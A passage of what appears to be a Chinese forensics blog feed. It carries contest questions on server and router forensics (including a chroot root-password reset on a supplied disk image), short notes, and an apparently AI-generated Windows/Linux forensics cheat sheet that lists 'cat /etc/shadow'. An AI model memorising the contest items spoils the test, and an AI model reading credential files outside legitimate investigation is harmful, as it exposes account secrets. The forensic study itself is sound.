href="#5-exam-allinone-flat-tar-xz-是-Docker-容器导出副本。找到网站“comet”对应的-SIGN-pem-并计算其-SHA1-哈希后-6-位（字母大写）">¶</a>5. exam-allinone-flat.tar.xz 是 Docker 容器导出副本。找到网站“comet”对应的 SIGN.pem 并计算其 SHA1 哈希后 6 位（字母大写）</h3><p>(1 分) [答案格式: ABC123][服务器取证]<br>提示：素材位置 “s5” 及虚拟机 /home/trek/s5；网站目录 /var/www；数据库配置信息默认位置；可导入容器或静态分析容器备份；容器导入启动参考 <a href="http://cmd.sh">cmd.sh</a>。</p><h3 id="6-d3systemd-with-services-flat-tar-xz-是-Docker-容器导出副本。分析容器激活时-4-个网站是否-active，用-0-15-表示。"><a class="header-anchor" href="#6-d3systemd-with-services-flat-tar-xz-是-Docker-容器导出副本。分析容器激活时-4-个网站是否-active，用-0-15-表示。">¶</a>6. d3systemd-with-services-flat.tar.xz 是 Docker 容器导出副本。分析容器激活时 4 个网站是否 active，用 0~15 表示。</h3><p>(1 分) [答案格式: 123][服务器取证]<br>网站 1：web-hotel；网站 2：web-golf@8089；网站 3：web-mike；网站 4：web-foxtrot。<br>提示：素材位置 “s6” 及虚拟机 /home/trek/s6；容器启动命令见 <a href="http://cmd.sh">cmd.sh</a>。</p><p>S7_9 目录下数据库是某系统的会员信息库，共 2 张表（用户信息、订单）。各表含义如列名所指。请通过恰当工具分析后回答 3 个问题。</p><h3 id="7-该组织架构共有多少层（从某个管理员开始的最深一层为准，管理员记-1-级）"><a class="header-anchor" href="#7-该组织架构共有多少层（从某个管理员开始的最深一层为准，管理员记-1-级）">¶</a>7. 该组织架构共有多少层（从某个管理员开始的最深一层为准，管理员记 1 级）</h3><p>(1 分) [答案格式: 123][服务器取证]</p><h3 id="8-会员表中-ID-为-7623-的人员位于人员层级的第几层（管理员为第-1-层）"><a class="header-anchor" href="#8-会员表中-ID-为-7623-的人员位于人员层级的第几层（管理员为第-1-层）">¶</a>8. 会员表中 ID 为 7623 的人员位于人员层级的第几层（管理员为第 1 层）</h3><p>(1 分) [答案格式: 123][服务器取证]</p><h3 id="9-ID-为-7623-的人员，其下层人数的总佣金-分红-为多少（算法：下第-1-层-5-，第-2-层-3-，第-3-层-1-，第-4-层及以下不计算）"><a class="header-anchor" href="#9-ID-为-7623-的人员，其下层人数的总佣金-分红-为多少（算法：下第-1-层-5-，第-2-层-3-，第-3-层-1-，第-4-层及以下不计算）">¶</a>9. ID 为 7623 的人员，其下层人数的总佣金(分红)为多少（算法：下第 1 层 5%，第 2 层 3%，第 3 层 1%，第 4 层及以下不计算）</h3><p>(1 分) [答案格式: 123][服务器取证]<br>提示：素材位置 “s7_9” 目录。</p><h3 id="10-尝试利用-chroot-或单用户模式修改-“s10-bypass-vmware-bypass-case-vmdk”-中-root-口令。执行-passwd-修改为-trek1009-后屏幕输出的-Executive-Code-是多少"><a class="header-anchor" href="#10-尝试利用-chroot-或单用户模式修改-“s10-bypass-vmware-bypass-case-vmdk”-中-root-口令。执行-passwd-修改为-trek1009-后屏幕输出的-Executive-Code-是多少">¶</a>10. 尝试利用 chroot 或单用户模式修改 “s10/bypass_vmware/bypass_case.vmdk” 中 root 口令。执行 passwd 修改为 trek1009 后屏幕输出的 Executive Code 是多少</h3><p>(1 分) [答案格式: 1234][服务器取证]<br>提示：素材位置 “s10”；bypass_vmware 可直接运行，ovf 目录为兜底方案；同样版本位于虚拟机 /home/trek/s10；仅用 chroot 或单用户方案，确保 Executive Code 正确。</p><h3 id="11-key-chal-deleted-tar-xz-是-Docker-容器导出副本。恢复其中的-117-pem-文件，并回答其-SHA1-哈希后-6-位（字母大写）"><a class="header-anchor" href="#11-key-chal-deleted-tar-xz-是-Docker-容器导出副本。恢复其中的-117-pem-文件，并回答其-SHA1-哈希后-6-位（字母大写）">¶</a>11. key-chal_deleted.tar.xz 是 Docker 容器导出副本。恢复其中的 117.pem 文件，并回答其 SHA1 哈希后 6 位（字母大写）</h3><p>(1 分) [答案格式: ABC123][服务器取证]<br>提示：素材位置 “s11” 及虚拟机 /home/trek/s11。</p><h3 id="12-虚拟机中曾有名为-5b630a9dab1b-的-Docker-容器于-2025-09-01-和-2025-09-02-日频繁重启。找到该日志数据，回答某天-19-51-52-的重启记录里时间戳纳秒部分的后四位数字。"><a class="header-anchor" href="#12-虚拟机中曾有名为-5b630a9dab1b-的-Docker-容器于-2025-09-01-和-2025-09-02-日频繁重启。找到该日志数据，回答某天-19-51-52-的重启记录里时间戳纳秒部分的后四位数字。">¶</a>12. 虚拟机中曾有名为 5b630a9dab1b 的 Docker 容器于 2025/09/01 和 2025/09/02 日频繁重启。找到该日志数据，回答某天 19:51:52 的重启记录里时间戳纳秒部分的后四位数字。</h3><p>(1 分) [答案格式: 1234][服务器取证]<br>提示：日志位置为 docker 默认路径；纳秒数字后紧跟一个字母表示时区。</p><p>s13_15/case103 目录中，是某台服务器备份的附件数据。文件原始名称被哈希转译。该目录包含：一个 Linux 可执行文件、一个 trek 格式归档包、一个未加密且数据规律的 sqlite 数据库中间片断，其余为某种加密文件。提示：trek 文件结构定义见 “TREK2025 Archive Format <a href="http://Specification.md">Specification.md</a>”。</p><h3 id="13-找出该-Linux-二进制可执行文件，回答其文件名称"><a class="header-anchor" href="#13-找出该-Linux-二进制可执行文件，回答其文件名称">¶</a>13. 找出该 Linux 二进制可执行文件，回答其文件名称</h3><p>(1 分) [答案格式: 1A2B3C4D][服务器取证]</p><h3 id="14-找出该-trek-格式归档包，回答其文件名称"><a class="header-anchor" href="#14-找出该-trek-格式归档包，回答其文件名称">¶</a>14. 找出该 trek 格式归档包，回答其文件名称</h3><p>(1 分) [答案格式: 1A2B3C4D][服务器取证]</p><h3 id="15-找出该-sqlite-数据库片断，回答其文件名"><a class="header-anchor" href="#15-找出该-sqlite-数据库片断，回答其文件名">¶</a>15. 找出该 sqlite 数据库片断，回答其文件名</h3><p>(1 分) [答案格式: 1A2B3C4D][服务器取证]</p><h3 id="16-set-101-tar-gz-解出的网站-nginx-日志（combined-log-format），统计-referer-为-“http-www-trek2025-ngo-tcrm-legal-case”-的唯一-IP-地址数量"><a class="header-anchor" href="#16-set-101-tar-gz-解出的网站-nginx-日志（combined-log-format），统计-referer-为-“http-www-trek2025-ngo-tcrm-legal-case”-的唯一-IP-地址数量">¶</a>16. set_101.tar.gz 解出的网站 nginx 日志（combined log format），统计 referer 为 “<a href="http://www.trek2025.ngo/tcrm/legal-case">http://www.trek2025.ngo/tcrm/legal-case</a>” 的唯一 IP 地址数量</h3><p>(1 分) [答案格式: 123][服务器取证]<br>提示：combined log format：IP 在首列，之后状态码与响应字节数，之后第一个双引号字段为 referer。</p><p>在现场找到了散放的 8 个硬盘。分析并回答下列问题：</p><h3 id="17-分析包含-NTFS-文件系统的-RAID，找出创建-RAID-时的成员硬盘，并按数字从小到大组成类似“1236”的字符串（不能排除掉线盘）"><a class="header-anchor" href="#17-分析包含-NTFS-文件系统的-RAID，找出创建-RAID-时的成员硬盘，并按数字从小到大组成类似“1236”的字符串（不能排除掉线盘）">¶</a>17. 分析包含 NTFS 文件系统的 RAID，找出创建 RAID 时的成员硬盘，并按数字从小到大组成类似“1236”的字符串（不能排除掉线盘）</h3><p>(1 分) [答案格式: 12345][服务器取证]</p><h3 id="18-该包含-NTFS-文件系统的-RAID，其组成结构的-chunk-大小为多少-KB"><a class="header-anchor" href="#18-该包含-NTFS-文件系统的-RAID，其组成结构的-chunk-大小为多少-KB">¶</a>18. 该包含 NTFS 文件系统的 RAID，其组成结构的 chunk 大小为多少 KB</h3><p>(1 分) [答案格式: 123][服务器取证]</p><h3 id="19-该-RAID-的组成方式最为符合下图的哪一种结构（仅指校验模式、数据排列方法，不特指成员盘数量）"><a class="header-anchor" href="#19-该-RAID-的组成方式最为符合下图的哪一种结构（仅指校验模式、数据排列方法，不特指成员盘数量）">¶</a>19. 该 RAID 的组成方式最为符合下图的哪一种结构（仅指校验模式、数据排列方法，不特指成员盘数量）</h3><p>(1 分) [答案格式: 01][服务器取证]<br>结构编号：01 ~ 10</p><h3 id="20-从该-RAID-中恢复-data01-zip-文件，并回答其-SHA256-哈希后-6-位（字母大写）"><a class="header-anchor" href="#20-从该-RAID-中恢复-data01-zip-文件，并回答其-SHA256-哈希后-6-位（字母大写）">¶</a>20. 从该 RAID 中恢复 data01.zip 文件，并回答其 SHA256 哈希后 6 位（字母大写）</h3><p>(1 分) [答案格式: ABC123][服务器取证]<br>提示：素材位置 “s17_20”；参考 sample.dbf.gz（解开的 oracle 数据库用于 raid 结构分析）；oracle 通常 8k 块大小，块 0x00~0x01 为块类型与格式版本标签性明显；0x04~0x07 为数据库块号及文件号规律性明显；data01.zip 恢复后应无损坏。</p><h1>第五届全国刑事技术技能大赛实操 · 电子物证-物联网部分</h1><h3 id="1-该存储镜像-RAW-格式的-SHA256-哈希值后-6-位（字母大写）为多少"><a class="header-anchor" href="#1-该存储镜像-RAW-格式的-SHA256-哈希值后-6-位（字母大写）为多少">¶</a>1. 该存储镜像 RAW 格式的 SHA256 哈希值后 6 位（字母大写）为多少</h3><p>(1 分) [答案格式: ABC123][物联网取证]</p><h3 id="2-该路由器后台管理地址是什么"><a class="header-anchor" href="#2-该路由器后台管理地址是什么">¶</a>2. 该路由器后台管理地址是什么</h3><p>(1 分) [答案格式: 192.168.1.1][物联网取证]</p><h3 id="3-该路由器主机名称是什么"><a class="header-anchor" href="#3-该路由器主机名称是什么">¶</a>3. 该路由器主机名称是什么</h3><p>(1 分) [答案格式: administrator][物联网取证]</p><h3 id="4-该路由器使用了哪种开源-vpn-方案"><a class="header-anchor" href="#4-该路由器使用了哪种开源-vpn-方案">¶</a>4. 该路由器使用了哪种开源 vpn 方案</h3><p>(1 分) [答案格式: freevpn][物联网取证]</p><h3 id="5-该路由器中设置的迅雷下载路径是什么"><a class="header-anchor" href="#5-该路由器中设置的迅雷下载路径是什么">¶</a>5. 该路由器中设置的迅雷下载路径是什么</h3><p>(1 分) [答案格式: /opt/download][物联网取证]</p><h3 id="6-该路由器下载了什么电影"><a class="header-anchor" href="#6-该路由器下载了什么电影">¶</a>6. 该路由器下载了什么电影</h3><p>(1 分) [答案格式: 变形金刚][物联网取证]</p><h3 id="7-该路由器屏蔽了什么广告域名"><a class="header-anchor" href="#7-该路由器屏蔽了什么广告域名">¶</a>7. 该路由器屏蔽了什么广告域名</h3><p>(1 分) [答案格式: <a href="http://abc.com">abc.com</a>][物联网取证]</p><h3 id="8-该路由器连接的-IPTV-机顶盒-MAC-地址是什么"><a class="header-anchor" href="#8-该路由器连接的-IPTV-机顶盒-MAC-地址是什么">¶</a>8. 该路由器连接的 IPTV 机顶盒 MAC 地址是什么</h3><p>(1 分) [答案格式: DA:11:22:1A:B2:1A][物联网取证]</p><h3 id="9-该路由器的上网行为管理中禁止什么应用联网"><a class="header-anchor" href="#9-该路由器的上网行为管理中禁止什么应用联网">¶</a>9. 该路由器的上网行为管理中禁止什么应用联网</h3><p>(1 分) [答案格式: 浏览器][物联网取证]</p><h3 id="10-该路由器的-wifi-启用计划时间范围是什么"><a class="header-anchor" href="#10-该路由器的-wifi-启用计划时间范围是什么">¶</a>10. 该路由器的 wifi 启用计划时间范围是什么</h3><p>(1 分) [答案格式: 04:00-05:00][物联网取证]</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后缀笔记</title>
      <link href="/2025/10/25/%E5%90%8E%E7%BC%80%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/25/%E5%90%8E%E7%BC%80%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>后缀</th><th>含义</th></tr></thead><tbody><tr><td>.dat</td><td>通用数据文件，常存储应用私有或二进制数据</td></tr><tr><td>.db</td><td>数据库文件（常见为 SQLite），用于结构化数据持久化</td></tr><tr><td>.ini</td><td>配置文件，以键值对保存程序设置</td></tr><tr><td>.xml</td><td>可扩展标记语言，用于存放结构化数据（配置、备份、日志等）</td></tr><tr><td>.plist</td><td>记录苹果基础信息</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识点笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决GitHub开启2FA双重身份验证</title>
      <link href="/2025/10/25/%E8%A7%A3%E5%86%B3GitHub%E5%BC%80%E5%90%AF2FA%E5%8F%8C%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
      <url>/2025/10/25/%E8%A7%A3%E5%86%B3GitHub%E5%BC%80%E5%90%AF2FA%E5%8F%8C%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://zhuanlan.zhihu.com/p/4456378990">参考</a></li><li><a href="https://mp.weixin.qq.com/s/IZrUYvd32ycKFwmuNwrlwQ">最后解决方案</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地AI安装</title>
      <link href="/2025/10/24/%E6%9C%AC%E5%9C%B0AI%E5%AE%89%E8%A3%85/"/>
      <url>/2025/10/24/%E6%9C%AC%E5%9C%B0AI%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="内容认证失败，但仍可尝试查看。">  <script id="hbeData" type="hbeData" data-hmacdigest="44164409df404c61c181ae7cb40c90216ab6440e2fe2d92e1882b509ea26908e">3327c967a865063d99c28176a6e61cec8e311586bc9b4be89c5edb7d17df33ced041306ae091e60e2b815d44c4f68fb07cfb19cc2b9262ebc14784c602b94fd3ba22a5f101603d807674fe61d23fffd26cdeb736a356d85a65d1c02699ef825d7f9a16f2ed9cad1037ac2233733bcaf7e32cb2799cdc34e83bf7ee81fdd090bd91873c5fe59296030734497b5e14e7098df0f2839c2111d2e677e34ac16ece0fca159e30350c576e86279aa1eb71528dd056f26346d0eaefa88199cc890a6d1dad102c14a93bcd2ec3ae7b31620f3eb9d8c1dabfa412891409712831aedc589345ac8eda2ec8f31749b4f857f0b39998d20cb63c0f51014ae04dfcb55474f324b2a1364523800e633649e9246e5c79ab788227bd0ebbb7766b9dcc49157674d6fcd92b7a8e855aee90b563a741f56166deb3b7ae53a80134d93906b77c4042556ea6fcfc47cae7158bf25bc4893d45a2e21e69c4921f6345518c1a732e539abcacceb903bc19a44b2f23780d3513802c625a34f1277ca93ae5460cebf5909cb75079acc622f2bc4c1371379ea654ff67a1fc0120457fb2374a36b3312aad641a10dda03679569a744358b2c60d0d92f1d948a1516cb3245bb8cbda5575fb31d52828296a8329a0b01346f3ee0736cfbf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>电子取证基础信息</title>
      <link href="/2025/10/23/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF/"/>
      <url>/2025/10/23/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>我先在网上快速检索权威资料，整理成结构化Markdown速查手册并附上参考链接。</p><p>toolName: web_search</p><p>status: success</p><p>query: NIST SP 800-86 Guide to Integrating Forensic Techniques into Incident Response PDF</p><p>toolName: web_search</p><p>status: success</p><p>query: Windows SRUM forensics System Resource Usage Monitor srum.db documentation</p><p>toolName: web_search</p><p>status: success</p><p>query: Windows Amcache forensic analysis location HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache ShimCache Prefetch forensic artifacts</p><p>toolName: web_search</p><p>status: success</p><p>query: Linux forensics logs locations journald /var/log auditd documentation man journalctl ausearch last lastlog wtmp btmp</p><p>toolName: web_search</p><p>status: success</p><p>query: Volatility 3 documentation usage Windows memory forensics Github volatilityfoundation vol3 docs</p><p>我将补充权威参考链接（NIST、Windows SRUM/Amcache、Linux日志），以便在Markdown中引用。</p><p>toolName: web_search</p><p>status: success</p><p>query: NIST SP 800-86 PDF Guide to Integrating Forensic Techniques into Incident Response</p><p>toolName: web_search</p><p>status: success</p><p>query: Windows SRUM forensics SRUDB.dat documentation site:Microsoft.com System Resource Usage Monitor</p><p>toolName: web_search</p><p>status: success</p><p>query: AppCompatCache ShimCache forensic Mandiant FireEye blog Amcache hve forensics Eric Zimmerman AmcacheParser</p><p>toolName: web_search</p><p>status: success</p><p>query: Linux logs wtmp btmp lastlog journalctl auditd documentation <a href="http://man7.org">man7.org</a></p><p>toolName: web_search</p><p>status: success</p><p>query: man7 systemd-journald journalctl documentation</p><p>toolName: web_search</p><p>status: success</p><p>query: man7 wtmp lastlog last command Linux manual page</p><p>toolName: web_search</p><p>status: success</p><p>query: site:learn.microsoft.com Windows Event Log overview event viewer documentation</p><p>toolName: web_search</p><p>status: success</p><p>query: site:learn.microsoft.com SRUM System Resource Utilization Monitor Windows SRUDB.dat documentation</p><p>toolName: web_search</p><p>status: success</p><p>query: Mandiant ShimCache AppCompatCache whitepaper PDF analysis Windows registry HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</p><p>toolName: web_search</p><p>status: success</p><p>query: Eric Zimmerman AmcacheParser documentation download GitHub</p><p>下面是一份可直接复制使用的 Markdown，汇总了电子取证中 Windows 与 Linux 的基础知识、常见证据来源、典型分析命令与工具，并附上权威参考链接。</p><p><strong>总体概览</strong></p><ul><li>数字取证典型四步：采集、检查、分析、报告（NIST SP 800-86）</li><li>Windows 重点：事件日志、内存（Volatility 3）、SRUM、Amcache、ShimCache/AppCompatCache、Prefetch、Jump Lists、LNK、MFT/USN、注册表</li><li>Linux 重点：systemd 日志（journalctl）、登录记录（wtmp/utmp/btmp/last/lastlog）、认证与审计（auth.log/secure、auditd）、sudo/cron、shell 历史、网络与系统日志</li><li>原则：先保全后分析；保证时间线一致性（时区、系统时间源）；保持证据可重复验证与链路完整</li></ul><hr><h2 id="Windows-取证基础"><a class="header-anchor" href="#Windows-取证基础">¶</a>Windows 取证基础</h2><h3 id="事件日志（Event-Log）"><a class="header-anchor" href="#事件日志（Event-Log）">¶</a>事件日志（Event Log）</h3><ul><li>路径：<code>C:\Windows\System32\winevt\Logs\*.evtx</code></li><li>常见日志：<ul><li><code>Application.evtx</code>：应用程序事件</li><li><code>System.evtx</code>：系统事件（驱动、服务）</li><li><code>Security.evtx</code>：安全事件（登录、权限、审计策略）</li><li><code>Microsoft-Windows-*</code>：ETW 提供程序下的“应用程序与服务日志”</li></ul></li><li>分析工具与方法：<ul><li>事件查看器（Event Viewer）</li><li>命令行与解析器（如 EvtxECmd）</li></ul></li><li>典型线索：登录事件（4624/4625）、账户添加/权限变更、服务/驱动安装、计划任务、Defender/AV 告警</li></ul><h3 id="内存取证（Volatility-3）"><a class="header-anchor" href="#内存取证（Volatility-3）">¶</a>内存取证（Volatility 3）</h3><ul><li>场景：进程与模块、网络连接、注入与隐藏进程、句柄、DLL、注册表 hive 缓存</li><li>Volatility 3 示例（视镜像类型与符号表而定）：<ul><li>列进程：<code>vol.py -f &lt;memdump&gt; windows.pslist</code></li><li>网络连接：<code>vol.py -f &lt;memdump&gt; windows.netstat</code></li><li>隐藏/可疑：<code>vol.py -f &lt;memdump&gt; windows.malfind</code></li></ul></li><li>注意：对于 Windows 内核版本与补丁，确保符号表可用；提取时保留原始镜像校验与采集元数据</li></ul><h3 id="SRUM（System-Resource-Usage-Monitor）"><a class="header-anchor" href="#SRUM（System-Resource-Usage-Monitor）">¶</a>SRUM（System Resource Usage Monitor）</h3><ul><li>路径：<code>C:\Windows\System32\sru\SRUDB.dat</code></li><li>线索：应用运行、网络使用、能耗估计等（Windows 8+）</li><li>命令：<ul><li><code>powercfg /srumutil /output &lt;file&gt;.xml</code></li></ul></li><li>常用解析工具：Eric Zimmerman <code>SrumECmd</code></li></ul><h3 id="ShimCache-AppCompatCache"><a class="header-anchor" href="#ShimCache-AppCompatCache">¶</a>ShimCache / AppCompatCache</h3><ul><li>ShimCache（AppCompatCache）位置（Vista+）：<ul><li>注册表：<code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache</code></li></ul></li><li>线索：文件路径、最后修改时间、大小等（重启/关机时序列化）</li><li>限制：不保证“执行”被确证（尤其 Vista+ 的 InsertFlag 不是执行证据）</li><li>常用工具：Eric Zimmerman <code>AppCompatCacheParser</code>、Mandiant <code>ShimCacheParser.py</code></li></ul><h3 id="Amcache"><a class="header-anchor" href="#Amcache">¶</a>Amcache</h3><ul><li>文件：<code>C:\Windows\AppCompat\Programs\Amcache.hve</code>（Windows 7+）</li><li>线索：程序/驱动安装与执行元数据（路径、SHA1、安装时间、发布者等），即便文件已删除仍可能保留</li><li>限制：不在所有情景下严格证明“执行”</li><li>常用工具：Eric Zimmerman <code>AmcacheParser</code></li></ul><h3 id="Prefetch"><a class="header-anchor" href="#Prefetch">¶</a>Prefetch</h3><ul><li>路径：<code>C:\Windows\Prefetch\*.pf</code>（客户端默认开启；服务器默认关闭）</li><li>线索：程序启动次数、上次运行时间、相关文件列表（加载痕迹）</li><li>配套：<code>PECmd</code> 解析</li></ul><h3 id="Jump-Lists-与-LNK"><a class="header-anchor" href="#Jump-Lists-与-LNK">¶</a>Jump Lists 与 LNK</h3><ul><li>Jump Lists：<code>%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\</code> 与 <code>CustomDestinations\</code></li><li>LNK：快捷方式（创建时间、目标路径、工作目录、卷序列号等），解析可获得访问痕迹</li><li>工具：<code>JLECmd</code>、<code>LECmd</code></li></ul><h3 id="文件系统与时间线"><a class="header-anchor" href="#文件系统与时间线">¶</a>文件系统与时间线</h3><ul><li>NTFS MFT：<code>$MFT</code>；USN 日志：<code>$Extend\$UsnJrnl</code></li><li>线索：创建/修改/访问时间、目录索引、重命名、移动、删除轨迹</li><li>工具：<code>MFTECmd</code>、Timeline 工具（Timeline Explorer）</li></ul><h3 id="注册表关键项"><a class="header-anchor" href="#注册表关键项">¶</a>注册表关键项</h3><ul><li>自启动：<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>、<code>RunOnce</code> 等</li><li>服务/驱动：<code>HKLM\SYSTEM\CurrentControlSet\Services\</code></li><li>最近运行相关：<code>UserAssist</code>、<code>ShimCache</code>、<code>Amcache</code></li><li>通用解析：Registry Explorer、RECmd</li></ul><hr><h2 id="Linux-取证基础"><a class="header-anchor" href="#Linux-取证基础">¶</a>Linux 取证基础</h2><h3 id="systemd-日志（journald-journalctl）"><a class="header-anchor" href="#systemd-日志（journald-journalctl）">¶</a>systemd 日志（journald / journalctl）</h3><ul><li>存储位置：<ul><li>持久：<code>/var/log/journal</code></li><li>易失：<code>/run/log/journal</code></li></ul></li><li>常用命令：<ul><li>按启动：<code>journalctl -b</code> / <code>journalctl -b -1</code>（上一启动）</li><li>按服务：<code>journalctl -u ssh</code>、<code>journalctl -u cron</code></li><li>按时间：<code>journalctl --since &quot;2025-10-01&quot; --until &quot;2025-10-02&quot;</code></li><li>实时：<code>journalctl -f</code></li></ul></li><li>配置：<code>/etc/systemd/journald.conf</code>（<code>Storage=</code> 控制持久化）</li></ul><h3 id="登录与认证记录"><a class="header-anchor" href="#登录与认证记录">¶</a>登录与认证记录</h3><ul><li><code>wtmp</code>（成功登录/注销、重启）：<code>/var/log/wtmp</code>，查看：<code>last</code>，读取归档：<code>last -f /var/log/wtmp.1</code></li><li><code>btmp</code>（失败登录）：<code>/var/log/btmp</code>，查看：<code>lastb</code>（需 root）</li><li><code>lastlog</code>（每用户上次登录）：<code>/var/log/lastlog</code>，查看：<code>lastlog</code></li><li>认证日志：<ul><li>Debian/Ubuntu：<code>/var/log/auth.log</code></li><li>RHEL/CentOS：<code>/var/log/secure</code></li></ul></li><li>其他：<ul><li>PAM 模块：<code>pam_lastlog</code>（显示/维护 lastlog 条目）</li></ul></li></ul><h3 id="审计（auditd）"><a class="header-anchor" href="#审计（auditd）">¶</a>审计（auditd）</h3><ul><li>服务与日志：<code>auditd</code>、<code>/var/log/audit/audit.log</code></li><li>常用命令：<ul><li>状态：<code>auditctl -s</code></li><li>搜索：<code>ausearch -k &lt;key&gt;</code>、<code>ausearch -x &lt;exe&gt;</code></li><li>报表：<code>aureport</code></li></ul></li><li>配置：<code>/etc/audit/auditd.conf</code>、规则：<code>/etc/audit/rules.d/*.rules</code></li></ul><h3 id="系统与用户活动"><a class="header-anchor" href="#系统与用户活动">¶</a>系统与用户活动</h3><ul><li>sudo：<code>/var/log/auth.log</code> 或 <code>/var/log/secure</code>（<code>sudo</code>, <code>su</code> 事件）</li><li>cron：<code>/var/log/cron</code> 或通过 <code>journalctl -u cron</code></li><li>Shell 历史：<ul><li>Bash：<code>~/.bash_history</code>（受 <code>HISTFILE</code>、<code>HISTSIZE</code>、<code>HISTTIMEFORMAT</code> 影响）</li><li>Zsh：<code>~/.zsh_history</code></li></ul></li><li>账户与组：<ul><li><code>cat /etc/passwd</code>、<code>cat /etc/shadow</code>（注意权限与保全）</li></ul></li><li>网络与系统日志：<ul><li><code>syslog</code>：<code>/var/log/syslog</code>（Debian/Ubuntu）</li><li><code>messages</code>：<code>/var/log/messages</code>（RHEL/CentOS）</li><li>rsyslog 配置：<code>/etc/rsyslog.conf</code>、<code>/etc/rsyslog.d/*.conf</code></li></ul></li></ul><h3 id="日志轮转与保全"><a class="header-anchor" href="#日志轮转与保全">¶</a>日志轮转与保全</h3><ul><li>轮转配置：<code>/etc/logrotate.d/</code>（如 <code>wtmp</code>/<code>btmp</code>）</li><li>保全建议：<ul><li>先对 <code>/var/log</code>、<code>/var/log/journal</code>、<code>/run/log/journal</code> 做位拷贝与校验</li><li>使用只读挂载或镜像方式采集（避免污染现场）</li></ul></li></ul><hr><h2 id="常用命令速查"><a class="header-anchor" href="#常用命令速查">¶</a>常用命令速查</h2><h3 id="Windows"><a class="header-anchor" href="#Windows">¶</a>Windows</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出事件日志（示例）</span></span><br><span class="line">wevtutil epl Security <span class="string">&quot;C:\temp\Security.evtx&quot;</span></span><br><span class="line">wevtutil epl System <span class="string">&quot;C:\temp\System.evtx&quot;</span></span><br><span class="line">wevtutil epl Application <span class="string">&quot;C:\temp\Application.evtx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SRUM 导出（XML/CSV）</span></span><br><span class="line">powercfg /srumutil /output <span class="string">&quot;C:\temp\srum.xml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Volatility 3 示例（需 Python 与 vol3）</span></span><br><span class="line">python vol.py <span class="operator">-f</span> C:\temp\memdump.raw windows.pslist</span><br><span class="line">python vol.py <span class="operator">-f</span> C:\temp\memdump.raw windows.netstat</span><br><span class="line">python vol.py <span class="operator">-f</span> C:\temp\memdump.raw windows.malfind</span><br></pre></td></tr></table></figure><h3 id="Linux"><a class="header-anchor" href="#Linux">¶</a>Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># journalctl</span></span><br><span class="line">journalctl -b</span><br><span class="line">journalctl -u ssh</span><br><span class="line">journalctl --since <span class="string">&quot;2025-10-01&quot;</span> --<span class="keyword">until</span> <span class="string">&quot;2025-10-02&quot;</span></span><br><span class="line">journalctl -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录记录</span></span><br><span class="line">last</span><br><span class="line">last -f /var/log/wtmp.1</span><br><span class="line">lastb            <span class="comment"># 失败登录（需要 root）</span></span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 审计</span></span><br><span class="line">auditctl -s</span><br><span class="line">ausearch -k suspicious</span><br><span class="line">aureport --summary</span><br></pre></td></tr></table></figure><hr><h2 id="工具与工作流建议"><a class="header-anchor" href="#工具与工作流建议">¶</a>工具与工作流建议</h2><ul><li>Windows<ul><li>事件日志：<code>EvtxECmd</code> 输出标准化 CSV/JSON/XML</li><li>注册表与系统工件：Registry Explorer、RECmd、<code>PECmd</code>、<code>LECmd</code>、<code>JLECmd</code>、<code>MFTECmd</code></li><li>程序执行与安装：<code>AmcacheParser</code>（Amcache）、<code>AppCompatCacheParser</code>（ShimCache）</li><li>SRUM：<code>SrumECmd</code></li><li>时间线：Timeline Explorer（对多源 CSV 合并）</li></ul></li><li>Linux<ul><li><code>journalctl</code>/<code>systemd-journald</code> 原生命令优先</li><li>审计：<code>auditd</code> + <code>ausearch</code>/<code>aureport</code></li><li>日志轮转与保全：<code>logrotate</code>、位拷贝 + 校验和（<code>sha256sum</code>）</li></ul></li><li>采集与保全<ul><li>统一记录取证元数据（时间、哈希、工具版本、操作者）</li><li>优先只读、可重复验证的提取方式；严格区分原始与工作副本</li><li>对时间线相关数据统一时区与时间源（UTC 推荐）</li></ul></li></ul><hr><h2 id="权威参考与文档"><a class="header-anchor" href="#权威参考与文档">¶</a>权威参考与文档</h2><ul><li>Volatility 3<ul><li>Volatility 3 文档：<a 